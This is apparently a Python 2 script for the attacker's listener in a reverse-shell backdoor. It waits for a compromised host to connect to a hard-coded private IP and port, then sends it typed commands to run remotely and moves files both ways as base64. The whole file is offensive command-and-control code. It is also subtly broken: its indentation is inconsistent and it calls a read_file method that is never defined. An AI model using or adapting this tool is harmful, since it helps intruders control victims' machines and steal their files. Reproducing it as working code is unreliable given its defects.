#!/usr/bin/env python
import socket,json,base64


class Listener:
	def __init__(self,ip,port):
		#self.ip = ip
		#self.port = port
		listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		listener.bind((ip,port))
		listener.listen(0)
		print("[+] Waiting for incoming connections!")
		self.connection, self.addr = listener.accept()
		print("[+] Got a new connection from ")
		print(self.addr)
		print(self.connection)
		msg = self.connection.recv(1024)
		print(msg)
	def send_reliable(self, data):
		json_data = json.dumps(data)
		self.connection.send(json_data)

	def receive_reliable(self):
		json_data = ""
		while True:
			try:
				json_data = json_data + self.connection.recv(1024)
				return json.loads(json_data)
			except:
				continue
	def write_file(self,path,content):
		with open(path,"wb") as file:
			decode_from_base64 = base64.b64decode(content)
			file.write(decode_from_base64)
			return "Download Successful"


    def execute_remotely(self,command):
        self.send_reliable(command)

        if command[0] == "exit":
            self.connection.close()
            exit()
        #elif:
        return self.receive_reliable()

	def run(self):
		while True:
			command = raw_input("Command: ")
			command = command.split(" ")
			if command[0] == "upload":
				file_content = self.read_file(command[1])
				command.append(file_content)#adding file data in argument of command
			command_result = self.execute_remotely(command)
			if command[0] == "download":
				result = self.write_file(command[1], command_result)
				print(result)

			print(command_result)

listener = Listener("192.168.184.154",4460)
listener.run()
